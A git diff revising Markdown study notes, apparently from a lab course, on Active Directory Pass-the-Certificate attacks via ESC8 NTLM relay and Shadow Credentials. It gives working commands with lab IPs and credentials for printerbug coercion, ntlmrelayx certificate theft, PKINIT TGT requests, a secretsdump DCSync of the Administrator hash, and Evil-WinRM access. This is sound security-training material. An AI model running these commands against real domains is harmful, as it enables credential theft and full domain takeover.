@@ -1,242 +1,225 @@
 # 🔐 1. Pass the Certificate
 
 > [!info]  
-> **Pass-the-Certificate (PtC)** is a Kerberos authentication technique that abuses **X.509 certificates** to obtain a **Kerberos Ticket Granting Ticket (TGT)**.
+> **Pass-the-Certificate (PtC)** uses an **X.509 certificate + private key** with **Kerberos PKINIT** to obtain a **Ticket Granting Ticket (TGT)** for an AD identity.
 > 
-> It is primarily encountered with:
+> The attack paths covered here are mainly:
 > 
-> - **Active Directory Certificate Services (AD CS)** attacks
+> - 🔥 **AD CS NTLM Relay — ESC8**
 >     
-> - **Shadow Credentials**
+> - 👻 **Shadow Credentials**
 >     
-> - **PKINIT** authentication
+> - 🎟️ **Certificate → TGT → Pass-the-Ticket**
 >     
 
 ---
 
 # 🧠 2. PKINIT — The Foundation
 
-**PKINIT** stands for:
+**PKINIT** = **Public Key Cryptography for Initial Authentication**.
 
-> **Public Key Cryptography for Initial Authentication**
-
-It is an extension to **Kerberos** that allows **public-key cryptography** to be used during the initial authentication exchange.
-
-Normally:
+It extends Kerberos so public-key cryptography can be used during the initial authentication exchange.
 
 ```text
-User
-  │
-  │ Username + password / Kerberos pre-auth
-  ▼
-KDC
-  │
-  │ TGT
-  ▼
-User
+Normal Kerberos:
+Username / Password
+       ↓
+      KDC
+       ↓
+      TGT
+
+PKINIT:
+Certificate + Private Key
+       ↓
+      KDC
+       ↓
+      TGT
 ```
 
-With PKINIT:
+This is commonly used for **smart-card authentication**, where the private key is stored on the smart card.
 
-```text
-User
-  │
-  │ X.509 certificate + private key
-  ▼
-KDC
-  │
-  │ Validates certificate
-  ▼
-TGT
-```
-
-This is commonly associated with **smart-card authentication**, where the smart card stores the user's private key.
-
-### 🎯 Why attackers care
-
-If an attacker obtains a certificate that can authenticate as another AD identity, they may be able to use that certificate to request a **TGT for that identity**.
-
-That gives us:
+### 🎯 Core idea
 
 ```text
 X.509 Certificate
-       ↓
-     PKINIT
-       ↓
-      TGT
-       ↓
+        ↓
+      PKINIT
+        ↓
+       TGT
+        ↓
 Pass-the-Ticket
-       ↓
-Authenticate as victim
+        ↓
+Kerberos authentication
 ```
 
 > [!important]  
-> **Pass-the-Certificate is not simply "logging in with a certificate."**
+> **Pass-the-Certificate is the certificate-to-TGT step.**
 > 
-> The important attack primitive is:
-> 
-> **Certificate → PKINIT → TGT → Kerberos authentication**
+> Once the `.ccache` TGT has been obtained, the attack becomes a normal **Pass-the-Ticket** workflow.
 
 ---
 
-# 🧬 3. Where Pass-the-Certificate Fits
-
-Pass-the-Certificate is especially important when working with:
-
-### 🏢 AD CS
-
-Misconfigurations or vulnerabilities in **Active Directory Certificate Services** can allow an attacker to obtain certificates for privileged identities.
-
-### 👻 Shadow Credentials
-
-An attacker who can modify another account's:
-
-```text
-msDS-KeyCredentialLink
-```
-
-attribute can add their own public key and subsequently authenticate as that account using PKINIT.
-
----
-
-# 🎯 4. AD CS NTLM Relay — ESC8
-
-## 🔥 What is ESC8?
+# 🔥 3. AD CS NTLM Relay — ESC8
 
 **ESC8** is an **NTLM relay attack against an AD CS HTTP enrollment endpoint**.
 
-AD CS can provide certificate enrollment through **web enrollment**.
-
-A typical web enrollment endpoint is:
+AD CS can provide certificate enrollment through **Web Enrollment**, commonly available at:
 
 ```text
-http://<CA>/CertSrv
+http://<CA-IP>/CertSrv
 ```
 
-The important idea is:
+The critical attack chain is:
 
 ```text
-Victim authenticates using NTLM
-          ↓
-      Attacker
-          ↓
-    NTLM relay
-          ↓
- AD CS Web Enrollment
-          ↓
- Certificate issued
-          ↓
-Pass-the-Certificate
-          ↓
-       TGT
+Victim / DC
+    │
+    │ NTLM authentication
+    ▼
+Attacker
+    │
+    │ NTLM Relay
+    ▼
+AD CS Web Enrollment
+    │
+    │ Certificate
+    ▼
+DC01.pfx
+    │
+    │ PKINIT
+    ▼
+DC01$ TGT
 ```
 
-> [!warning]  
-> The key weakness is that the attacker does **not** need to know the victim's password.
-> 
-> They relay the victim's NTLM authentication to the AD CS enrollment service.
+> [!important]  
+> ESC8 is particularly powerful because the attacker can turn a **relayed machine-account authentication** into a certificate that can later be used for **Kerberos authentication**.
 
 ---
 
-# 🛠️ 5. Setting Up ntlmrelayx
+# 🌐 4. Know Your IP Addresses
 
-Impacket's `ntlmrelayx` can listen for inbound authentication and relay it to the AD CS web enrollment endpoint.
+One of the easiest ways to get confused during this attack is mixing up the **attacker**, **AD CS/CA**, and **Domain Controller** IPs.
+
+In the lab example:
+
+|IP|Role|Used For|
+|---|---|---|
+|`10.129.234.172`|🏢 **AD CS / Certificate Authority server**|Web Enrollment target for `ntlmrelayx`|
+|`10.129.234.174`|🎯 **Domain Controller (DC01)**|PKINIT/KDC, Kerberos authentication, DCSync/target|
+|`10.10.16.12`|💻 **Attacker**|Receives coerced authentication|
+
+### 🧠 Remember
+
+```text
+10.129.234.172
+       │
+       └── AD CS / CA
+           "Give me a certificate"
+
+10.129.234.174
+       │
+       └── Domain Controller / KDC
+           "Give me a Kerberos TGT"
+
+10.10.16.12
+       │
+       └── Attacker
+           "Send authentication here"
+```
+
+> [!warning]  
+> The IP used with `gettgtpkinit.py -dc-ip` is the **Domain Controller/KDC IP**, **not automatically the AD CS server IP**.
+> 
+> In this lab:
+> 
+> **CA = `10.129.234.172`**
+> 
+> **DC/KDC = `10.129.234.174`**
+
+---
+
+# 🛠️ 5. Start ntlmrelayx
+
+The attacker listens for incoming authentication and relays it to the AD CS Web Enrollment endpoint.
+
+The lab command used was:
 
 ```bash
-impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
+ntlmrelayx.py -t http://10.129.234.172/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication --http-port 8080
+```
+
+### 🔎 IP roles in this command
+
+```text
+-t http://10.129.234.172/certsrv/certfnsh.asp
+       ↑
+       AD CS / Certificate Authority
+       Web Enrollment endpoint
+
+ntlmrelayx itself
+       ↑
+       Running on ATTACKER
 ```
 
 ### 🔎 Important options
 
-|Option|Purpose|
+|Option|Meaning|
 |---|---|
-|`-t`|Specifies the relay target|
-|`--adcs`|Enables AD CS certificate enrollment functionality|
-|`-smb2support`|Enables SMB2 support|
-|`--template`|Specifies the certificate template to request|
+|`-t`|Relay target|
+|`--adcs`|Enable AD CS certificate enrollment|
+|`-smb2support`|Enable SMB2 support|
+|`--template KerberosAuthentication`|Certificate template requested for Kerberos authentication|
+|`--http-port 8080`|Run ntlmrelayx's HTTP listener on port `8080`|
 
-In this example:
-
-```text
-Target:
-http://10.129.234.110/certsrv/certfnsh.asp
-
-Template:
-KerberosAuthentication
-```
-
-> [!important]  
-> The certificate template may be different depending on the environment.
-> 
-> The appropriate template can be enumerated using tools such as **Certipy**.
+> [!tip]  
+> The `--template` value is environment-dependent. In the lab it was `KerberosAuthentication`. Certificate templates can be enumerated with tools such as **Certipy**.
 
 ---
 
-# 🖨️ 6. Getting a Victim to Authenticate — Printer Bug
+# 🖨️ 6. Coerce the Domain Controller
 
-Starting `ntlmrelayx` is not enough. We need a machine or user to authenticate to our attacking machine.
+We need the victim machine to authenticate to our attacker.
 
-There are two possibilities:
-
-```text
-1. Wait for authentication
-2. Coerce authentication
-```
-
-One coercion technique is the **Printer Bug**.
-
-The Printer Bug abuses the **Print Spooler** service to force a machine account to authenticate to an arbitrary host.
-
-### 📌 Requirement
-
-The target machine must have the:
-
-```text
-Print Spooler
-```
-
-service running.
-
----
-
-## 💻 6.1 Triggering the Printer Bug
-
-Example:
+The lab uses the **Printer Bug** to coerce the Domain Controller.
 
 ```bash
-python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.174 10.10.14.214
+python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.174 10.10.16.12
 ```
 
-Here:
+### 🌐 IP roles
 
 ```text
-Target DC:
-10.129.234.109
+10.129.234.174
+      ↑
+      TARGET / Domain Controller (DC01)
 
-Attacker:
 10.10.16.12
+      ↑
+      ATTACKER
 ```
 
-The objective is:
+So:
 
 ```text
-DC01
- │
- │ Forced authentication
- ▼
-Attacker machine
- │
- │ NTLM relay
- ▼
-AD CS
+printerbug.py
+     │
+     │ Coerce
+     ▼
+DC01 (10.129.234.174)
+     │
+     │ NTLM authentication
+     ▼
+Attacker (10.10.16.12)
 ```
+
+The target requires the **Print Spooler** service to be running.
 
 Example output:
 
 ```text
 [*] Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
-[*] Attempting to trigger authentication via rprn RPC at 10.129.234.109
+[*] Attempting to trigger authentication via rprn RPC at 10.129.234.174
 [*] Bind OK
 [*] Got handle
 RPRN SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE - The RPC server is unavailable.
@@ -244,138 +227,135 @@ RPRN SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE - The RPC server is un
 ```
 
 > [!warning]  
-> The `RPC_S_SERVER_UNAVAILABLE` message does not necessarily mean the coercion failed.
-> 
-> The output itself indicates:
-> 
-> `Triggered RPC backconnect, this may or may not have worked`
-> 
-> Therefore, check the attacker's `ntlmrelayx` output for the incoming authentication.
+> `RPC_S_SERVER_UNAVAILABLE` does not necessarily mean the coercion failed. Check `ntlmrelayx` for the incoming authentication.
 
 ---
 
-# 🔄 7. What Happens During the Relay?
+# 🔄 7. Verify the Relay Worked
 
-When the target machine authenticates, `ntlmrelayx` receives the authentication.
-
-Relevant output:
+The important `ntlmrelayx` output looks like:
 
 ```text
 [*] Servers started, waiting for connections
-[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.129.234.109, attacking target http://10.129.234.110
-[*] HTTP server returned error code 404, treating as a successful login
-[*] Authenticating against http://10.129.234.110 as INLANEFREIGHT/DC01$ SUCCEED
+
+[*] (SMB): Received connection from 10.129.234.174, attacking target http://10.129.234.172
+
+[*] HTTP server returned error code 200, treating as a successful login
+
+[*] (SMB): Authenticating connection from INLANEFREIGHT/DC01$@10.129.234.174 against http://10.129.234.172 SUCCEED
 ```
 
-The important event is:
+### 🧠 Read the output carefully
 
 ```text
-DC01$
-   ↓
-NTLM authentication
-   ↓
-ntlmrelayx
-   ↓
-AD CS
-   ↓
-Authentication succeeds
+Received connection from 10.129.234.174
+              ↑
+              DC01 / victim
+
+attacking target http://10.129.234.172
+              ↑
+              AD CS / CA
 ```
 
-Then `ntlmrelayx` requests a certificate:
+Therefore:
 
 ```text
-[*] Generating CSR...
-[*] CSR generated!
-[*] Getting certificate...
-[*] GOT CERTIFICATE! ID 8
-[*] Writing PKCS#12 certificate to ./DC01$.pfx
-[*] Certificate successfully written to file
-```
-
-The result is:
-
-```text
-DC01$.pfx
+DC01 (10.129.234.174)
+          │
+          │ NTLM
+          ▼
+     ntlmrelayx
+          │
+          │ Relay
+          ▼
+AD CS (10.129.234.172)
 ```
 
 ---
 
-# 📦 8. Understanding the PFX Certificate
+# 📜 8. Certificate Successfully Issued
+
+The successful relay continues:
+
+```text
+[*] http://INLANEFREIGHT/DC01$@10.129.234.172 [1] -> Using template name: KerberosAuthentication
+[*] http://INLANEFREIGHT/DC01$@10.129.234.172 [1] -> Generating CSR...
+[*] http://INLANEFREIGHT/DC01$@10.129.234.172 [1] -> CSR generated!
+[*] http://INLANEFREIGHT/DC01$@10.129.234.172 [1] -> Getting certificate...
+[*] http://INLANEFREIGHT/DC01$@10.129.234.172 [1] -> GOT CERTIFICATE! ID 33
+[*] http://INLANEFREIGHT/DC01$@10.129.234.172 [1] -> Writing PKCS#12 certificate to ./DC01.pfx
+[*] http://INLANEFREIGHT/DC01$@10.129.234.172 [1] -> Certificate successfully written to file
+```
+
+### 🚨 The key success indicators
+
+Look for:
+
+```text
+GOT CERTIFICATE!
+```
+
+and:
+
+```text
+Writing PKCS#12 certificate to ./DC01.pfx
+```
+
+and finally:
+
+```text
+Certificate successfully written to file
+```
+
+> [!success]  
+> This means the **ESC8 portion succeeded**:
+> 
+> **DC01 authentication → NTLM Relay → AD CS → DC01 certificate → `DC01.pfx`**
+
+---
+
+# 📦 9. Understand the `.pfx`
 
 The resulting:
 
 ```text
-DC01$.pfx
+DC01.pfx
 ```
 
 is a **PKCS#12** file.
 
-It can contain:
-
-- X.509 certificate
-    
-- Private key
-    
-
-This is extremely valuable because the certificate + private key can be used for PKINIT.
-
-Mental model:
+It contains the certificate material required for the next stage, including the private key.
 
 ```text
-NTLM Relay
-     ↓
-Certificate Enrollment
-     ↓
-DC01$.pfx
-     ↓
-Certificate + Private Key
-     ↓
+DC01$
+  │
+  │ NTLM Relay
+  ▼
+AD CS
+  │
+  │ Certificate
+  ▼
+DC01.pfx
+  │
+  │ Certificate + Private Key
+  ▼
 PKINIT
-     ↓
-DC01$ TGT
 ```
 
 ---
 
-# 🎟️ 9. Certificate → TGT with gettgtpkinit.py
+# 🎟️ 10. Certificate → TGT with gettgtpkinit.py
 
-We can use **PKINITtools** and specifically:
+Now switch from the **AD CS server** to the **Domain Controller/KDC**.
 
-```text
-gettgtpkinit.py
-```
-
-to use the certificate for Kerberos PKINIT authentication.
-
----
-
-## 📥 9.1 Clone PKINITtools
+Install **PKINITtools**:
 
 ```bash
 git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
-```
-
-Create a Python virtual environment:
-
-```bash
 python3 -m venv .venv
-```
-
-Activate it:
-
-```bash
 source .venv/bin/activate
-```
-
-Install dependencies:
-
-```bash
 pip3 install -r requirements.txt
 ```
-
----
-
-## ⚠️ 9.2 `libcrypto` Error
 
 If you encounter:
 
@@ -383,49 +363,61 @@ If you encounter:
 Error detecting the version of libcrypto
 ```
 
-the source recommends installing `oscrypto` directly from Git:
+install `oscrypto`:
 
 ```bash
 pip3 install -I git+https://github.com/wbond/oscrypto.git
 ```
 
-Example successful output:
-
-```text
-Successfully built oscrypto
-Installing collected packages: asn1crypto, oscrypto
-Successfully installed asn1crypto-1.5.1 oscrypto-1.3.0
-```
-
 ---
 
-# 🎟️ 10. Requesting the DC01$ TGT
+# 🎯 11. Request the DC01$ TGT
 
-Use the certificate to request a TGT:
+In this lab, the correct command is:
 
 ```bash
-python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.172 'inlanefreight.local/dc01$' /tmp/dc.ccache
+python3 gettgtpkinit.py -cert-pfx /root/DC01.pfx -dc-ip 10.129.234.174 'inlanefreight.local/dc01$' /tmp/dc.ccache
 ```
 
-### 🧠 Break it down
+### 🔎 Understand every important part
 
 ```text
--cert-pfx
-    ↓
-Certificate + private key
+-cert-pfx /root/DC01.pfx
+       ↓
+Certificate obtained from AD CS
 
--dc-ip
-    ↓
-Domain Controller IP
+-dc-ip 10.129.234.174
+       ↓
+Domain Controller / KDC
+NOT the AD CS server
 
-'inlanefreight.local/dc01$'
-    ↓
-Principal being authenticated as
+inlanefreight.local/dc01$
+       ↓
+Identity we want the TGT for
 
 /tmp/dc.ccache
-    ↓
-Where the obtained TGT is stored
+       ↓
+Save the resulting Kerberos credential cache here
 ```
+
+### 🧠 The IP distinction
+
+```text
+AD CS:
+10.129.234.172
+     ↓
+Used earlier by ntlmrelayx
+
+Domain Controller:
+10.129.234.174
+     ↓
+Used by gettgtpkinit.py -dc-ip
+```
+
+> [!important]  
+> **`-dc-ip` means "which KDC/DC should process my Kerberos request?"**
+> 
+> Therefore, use the **Domain Controller's IP**.
 
 Successful output includes:
 
@@ -437,154 +429,249 @@ Successful output includes:
 [*] Saved TGT to file
 ```
 
-The important result is:
+Result:
 
 ```text
 /tmp/dc.ccache
-```
-
-We now possess a Kerberos credential cache containing a TGT for:
-
-```text
-DC01$
 ```
 
 ---
 
-# 🔥 11. From Pass-the-Certificate → Pass-the-Ticket
+# ⏱️ 12. What Happens During `gettgtpkinit.py`?
 
-At this point, the certificate attack has achieved its goal.
-
-We have:
+The command communicates with the **KDC on the Domain Controller**.
 
 ```text
-DC01$.pfx
-     ↓
-gettgtpkinit.py
-     ↓
+DC01.pfx
+   │
+   │ Certificate authentication
+   ▼
+KDC / DC01
+   │
+   │ PKINIT
+   ▼
+TGT for DC01$
+   │
+   ▼
 /tmp/dc.ccache
-     ↓
-DC01$ TGT
 ```
 
-From here, the attack becomes a familiar **Pass-the-Ticket** workflow.
+> [!info]  
+> `Requesting TGT` means the tool is actively communicating with the KDC. Normally the operation should complete quickly, but network connectivity, routing, or KDC responsiveness can cause delays/timeouts.
 
-Set the Kerberos credential cache:
+---
+
+# 🎫 13. Use the TGT — Pass-the-Ticket
+
+Once the TGT exists, export it:
 
 ```bash
 export KRB5CCNAME=/tmp/dc.ccache
 ```
 
-Now tools supporting Kerberos can use the ticket.
+Verify:
+
+```bash
+klist
+```
+
+You should see a principal similar to:
+
+```text
+Default principal: dc01$@INLANEFREIGHT.LOCAL
+```
+
+and:
+
+```text
+krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
+```
+
+Mental model:
+
+```text
+Certificate
+    ↓
+PKINIT
+    ↓
+TGT
+    ↓
+.ccache
+    ↓
+KRB5CCNAME
+    ↓
+Kerberos-aware tools
+```
 
 ---
 
-# 💀 12. DCSync Using the DC01$ TGT
+# 💀 14. DCSync with the DC01$ TGT
 
-Because the compromised identity is the **domain controller machine account**, it can potentially perform powerful domain operations.
+The Domain Controller machine account can be extremely powerful.
 
-The example uses:
+The source demonstrates using:
 
 ```bash
-impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
+impacket-secretsdump -k -no-pass -dc-ip 10.129.234.174 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
 ```
+
+### 🌐 IP role
+
+```text
+10.129.234.174
+      ↑
+      Domain Controller / target
+```
+
+It is **not** the AD CS server.
 
 ### 🔎 Important options
 
 |Option|Meaning|
 |---|---|
 |`-k`|Use Kerberos authentication|
-|`-no-pass`|Do not prompt for a password|
-|`-dc-ip`|Specify the Domain Controller IP|
-|`-just-dc-user Administrator`|Retrieve only the specified user's domain credentials|
+|`-no-pass`|Do not request a password|
+|`-dc-ip 10.129.234.174`|Domain Controller IP|
+|`-just-dc-user Administrator`|Request credentials for the specified domain user|
 
-The attack uses the **DRSUAPI** method:
+The attack uses the **DRSUAPI** method to retrieve domain secrets.
 
 ```text
 DC01$ TGT
     ↓
 Kerberos authentication
     ↓
-DCSync
+DRSUAPI / DCSync
     ↓
-DRSUAPI
-    ↓
-NTDS.DIT secrets
+Domain credential material
     ↓
 Administrator NTLM hash
 ```
 
-Example output:
+---
+
+# 🧩 15. Troubleshooting: The IP Matters
+
+A major lesson from the lab is that **different stages use different machines**.
+
+### ❌ Wrong mental model
 
 ```text
-[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
-[*] Using the DRSUAPI method to get NTDS.DIT secrets
-Administrator:500:aad3b435b51404ee4aad3b435b51404ee:...SNIP...:::
+"Use the same IP everywhere."
 ```
 
+### ✅ Correct mental model
+
+```text
+             ATTACKER
+          10.10.16.12
+               │
+               │ Coerce authentication
+               │
+               ▼
+        DOMAIN CONTROLLER
+         10.129.234.174
+               │
+               │ NTLM authentication
+               ▼
+            ATTACKER
+               │
+               │ Relay
+               ▼
+          AD CS / CA
+         10.129.234.172
+               │
+               │ Certificate
+               ▼
+          DC01.pfx
+               │
+               │ PKINIT
+               ▼
+        DOMAIN CONTROLLER
+         10.129.234.174
+               │
+               │ TGT
+               ▼
+         /tmp/dc.ccache
+```
+
+### 📌 Quick rule
+
+|Command|IP should represent|
+|---|---|
+|`printerbug.py ... @<IP> <attacker-IP>`|First IP = 🎯 **Target/DC**, second IP = 💻 **Attacker**|
+|`ntlmrelayx -t http://<IP>/certsrv/...`|IP = 🏢 **AD CS / CA**|
+|`gettgtpkinit.py -dc-ip <IP>`|IP = 🎯 **Domain Controller / KDC**|
+|`secretsdump -dc-ip <IP>`|IP = 🎯 **Domain Controller**|
+|`evil-winrm -i <IP>`|IP = 🎯 **Remote Windows target**|
+
 > [!important]  
-> The critical chain to remember is:
+> This distinction explains the timeout encountered when the **AD CS IP** was supplied to `gettgtpkinit.py`.
 > 
-> **ESC8 → NTLM Relay → DC certificate → PKINIT → DC01$ TGT → DCSync → Domain credentials**
+> If the CA is a separate server, `gettgtpkinit.py -dc-ip` must point to the **DC/KDC**, not the CA.
 
 ---
 
-# 👻 13. Shadow Credentials
+# 👻 16. Shadow Credentials
 
-## 🧠 What Are Shadow Credentials?
+A second major Pass-the-Certificate path is **Shadow Credentials**.
 
-**Shadow Credentials** abuse the Active Directory attribute:
+The attack abuses:
 
 ```text
 msDS-KeyCredentialLink
 ```
 
-This attribute stores public keys that can be used for authentication through **PKINIT**.
+This AD attribute stores public keys that can be used for authentication through PKINIT.
 
-The attack works when an attacker has permission to modify this attribute on another account.
-
----
-
-# 🔑 14. BloodHound — AddKeyCredentialLink
-
-BloodHound represents the relevant relationship as:
+BloodHound represents the relevant permission as:
 
 ```text
 AddKeyCredentialLink
 ```
 
-Conceptually:
+Meaning one account has sufficient write permissions over another account's:
 
 ```text
-Attacker
-   │
-   │ Write permission
-   ▼
-Victim's msDS-KeyCredentialLink
-   │
-   │ Add attacker's public key
-   ▼
-Victim account
-   │
-   │ PKINIT
-   ▼
-Victim TGT
+msDS-KeyCredentialLink
 ```
 
-> [!important]  
-> The key prerequisite is **write access to the victim's `msDS-KeyCredentialLink` attribute**.
+attribute.
 
 ---
 
-# 🛠️ 15. Shadow Credentials with pywhisker
-
-The source demonstrates using:
+# 🔑 17. Shadow Credential Attack Flow
 
 ```text
-pywhisker
+Attacker has write access
+          │
+          ▼
+msDS-KeyCredentialLink
+          │
+          │ Add attacker's public key
+          ▼
+Victim account
+          │
+          │ Use corresponding private key
+          ▼
+X.509 certificate / PFX
+          │
+          ▼
+PKINIT
+          │
+          ▼
+Victim TGT
+          │
+          ▼
+Pass-the-Ticket
 ```
 
-from Linux.
+> [!important]  
+> The critical prerequisite is **write access to the victim's `msDS-KeyCredentialLink` attribute**.
+
+---
+
+# 🛠️ 18. Shadow Credentials with pywhisker
 
 Example:
 
@@ -592,25 +679,19 @@ Example:
 pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
 ```
 
-### 🎯 What this performs
-
-The command:
-
-1. Searches for the target account.
-    
-2. Generates an X.509 certificate.
-    
-3. Generates a KeyCredential.
-    
-4. Adds the public key to the victim's `msDS-KeyCredentialLink`.
-    
-5. Converts the certificate/key into a PFX file.
-    
-
-Output:
+This performs several operations:
 
 ```text
-[*] Searching for the target account
+1. Find target account
+2. Generate X.509 certificate
+3. Generate KeyCredential
+4. Add public key to msDS-KeyCredentialLink
+5. Export certificate/private key as PFX
+```
+
+Example result:
+
+```text
 [*] Target user found: CN=Jesse Pinkman,CN=Users,DC=inlanefreight,DC=local
 [*] Generating certificate
 [*] Certificate generated
@@ -619,49 +700,51 @@ Output:
 [*] Updating the msDS-KeyCredentialLink attribute of jpinkman
 [+] Updated the msDS-KeyCredentialLink attribute of the target object
 [*] Converting PEM -> PFX with cryptography: eFUVVTPf.pfx
-[+] PFX exportiert nach: eFUVVTPf.pfx
-[i] Passwort für PFX: bmRH4LK7UwPrAOfvIx6W
 [+] Saved PFX (#PKCS12) certificate & key at path: eFUVVTPf.pfx
 [*] Must be used with password: bmRH4LK7UwPrAOfvIx6W
-[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
 ```
 
-The resulting file is:
+Result:
 
 ```text
 eFUVVTPf.pfx
 ```
 
-and the PFX password is displayed by the tool.
-
 ---
 
-# 🎟️ 16. Obtain the Victim's TGT
+# 🎟️ 19. Get the Victim's TGT
 
-Use the generated PFX with `gettgtpkinit.py`:
+Use the generated PFX:
 
 ```bash
 python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
 ```
 
-The important transformation is:
+Again:
 
 ```text
-Attacker controls
-msDS-KeyCredentialLink
-        ↓
-Generate certificate
-        ↓
-Store public key on victim
-        ↓
-PFX + private key
-        ↓
-PKINIT
-        ↓
-Victim's TGT
+-cert-pfx
+    ↓
+Certificate/private key
+
+-pfx-pass
+    ↓
+Password protecting PFX
+
+-dc-ip
+    ↓
+Domain Controller / KDC
+
+INLANEFREIGHT.LOCAL/jpinkman
+    ↓
+Victim identity
+
+/tmp/jpinkman.ccache
+    ↓
+Output TGT cache
 ```
 
-Successful output:
+Successful result:
 
 ```text
 [*] Loading certificate and key from file
@@ -671,15 +754,9 @@ Successful output:
 [*] Saved TGT to file
 ```
 
-The resulting cache is:
-
-```text
-/tmp/jpinkman.ccache
-```
-
 ---
 
-# 🎫 17. Use the Victim's TGT
+# 🎫 20. Verify and Use the Victim TGT
 
 Set the cache:
 
@@ -687,13 +764,13 @@ Set the cache:
 export KRB5CCNAME=/tmp/jpinkman.ccache
 ```
 
-Verify it:
+Check it:
 
 ```bash
 klist
 ```
 
-Output:
+Expected:
 
 ```text
 Ticket cache: FILE:/tmp/jpinkman.ccache
@@ -703,12 +780,11 @@ Valid starting       Expires              Service principal
 04/28/2025 20:50:04  04/29/2025 06:50:04  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
 ```
 
-### 🔎 What this tells us
-
-The important line is:
+The important parts are:
 
 ```text
-Default principal: jpinkman@INLANEFREIGHT.LOCAL
+Default principal:
+jpinkman@INLANEFREIGHT.LOCAL
 ```
 
 and:
@@ -717,33 +793,35 @@ and:
 krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
 ```
 
-indicates that the cache contains the **domain TGT**.
+which indicates the cache contains the domain TGT.
 
 ---
 
-# 🖥️ 18. Using the TGT with Evil-WinRM
+# 🖥️ 21. Remote Access with Evil-WinRM
 
-In the example, `jpinkman` belongs to:
+If the victim account has appropriate WinRM permissions, such as membership in:
 
 ```text
 Remote Management Users
 ```
 
-This permits remote management access through **WinRM**.
-
-With the Kerberos cache configured and `krb5.conf` properly configured:
+the Kerberos TGT can be used with **Evil-WinRM**.
 
 ```bash
 evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
 ```
 
-Successful connection:
+### 🌐 IP/hostname role
 
 ```text
-Evil-WinRM shell v3.7
+dc01.inlanefreight.local
+        ↓
+Remote Windows target / Domain Controller
+```
 
-Info: Establishing connection to remote endpoint
+Successful authentication:
 
+```text
 *Evil-WinRM* PS C:\Users\jpinkman\Documents> whoami
 inlanefreight\jpinkman
 ```
@@ -751,48 +829,46 @@ inlanefreight\jpinkman
 Mental model:
 
 ```text
-Shadow Credential
-      ↓
+Shadow Credentials
+       ↓
 Victim Certificate
-      ↓
+       ↓
 PKINIT
-      ↓
+       ↓
 Victim TGT
-      ↓
+       ↓
 KRB5CCNAME
-      ↓
+       ↓
 Evil-WinRM
-      ↓
-Remote Access as Victim
+       ↓
+Remote session as victim
 ```
 
 ---
 
-# 🚫 19. What If PKINIT Is Not Supported?
+# 🚫 22. What If PKINIT Is Not Supported?
 
-Sometimes an attacker can obtain a certificate but cannot use it for PKINIT authentication as the desired identity.
+Sometimes a certificate can be obtained but cannot be used for PKINIT for a particular identity.
 
 For example:
 
 ```text
 Certificate obtained
        ↓
-Attempt PKINIT
+PKINIT attempted
        ↓
 KDC does not support appropriate EKU
        ↓
-PKINIT authentication fails
+PKINIT fails
 ```
 
-In such situations, the source introduces:
+The source introduces:
 
 ```text
 PassTheCert
 ```
 
-This tool can authenticate against **LDAPS using a certificate** and perform various attacks.
-
-Examples mentioned include:
+This can authenticate against **LDAPS using a certificate** and perform attacks such as:
 
 - Changing passwords
     
@@ -800,44 +876,11 @@ Examples mentioned include:
     
 
 > [!warning]  
-> This is a separate attack path from the PKINIT workflow and is outside the scope of this module section.
+> PassTheCert is a different certificate-based attack path and is outside the scope of this section.
 
 ---
 
-# 🧠 20. The Two Main Pass-the-Certificate Paths
-
-|Attack Path|Starting Point|Certificate Obtained Through|Result|
-|---|---|---|---|
-|**ESC8**|NTLM relay|AD CS Web Enrollment|Certificate for target machine/account|
-|**Shadow Credentials**|Write access to `msDS-KeyCredentialLink`|pywhisker-generated certificate|Certificate for target account|
-
-Both can converge here:
-
-```text
-                    ┌──────────────────────┐
-                    │ Certificate obtained │
-                    └──────────┬───────────┘
-                               │
-                               ▼
-                           PKINIT
-                               │
-                               ▼
-                        ┌─────────────┐
-                        │     TGT     │
-                        └──────┬──────┘
-                               │
-                               ▼
-                       Pass-the-Ticket
-                               │
-                    ┌──────────┴──────────┐
-                    ▼                     ▼
-              Remote Access          DCSync /
-              / WinRM                AD attacks
-```
-
----
-
-# 🔥 21. ESC8 vs Shadow Credentials
+# 🧠 23. ESC8 vs Shadow Credentials
 
 |Feature|ESC8|Shadow Credentials|
 |---|---|---|
@@ -853,161 +896,114 @@ Both can converge here:
 
 ---
 
-# 🧠 22. The Big Mental Model
-
-## 🔴 ESC8
+# ⚡ 24. Complete ESC8 Cheat Sheet
 
 ```text
-          COERCE
-            │
-            ▼
-       DC01 authenticates
-            │
-            │ NTLM
-            ▼
-      ┌─────────────┐
-      │ ntlmrelayx  │
-      └──────┬──────┘
-             │
-             │ Relay
-             ▼
-       AD CS /CertSrv
-             │
-             │ Certificate
-             ▼
-          DC01$.pfx
-             │
-             │ PKINIT
-             ▼
-         DC01$ TGT
-             │
-             ▼
-         DCSync / PtT
+                    💻 ATTACKER
+                   10.10.16.12
+                        │
+                        │ Printer Bug
+                        │
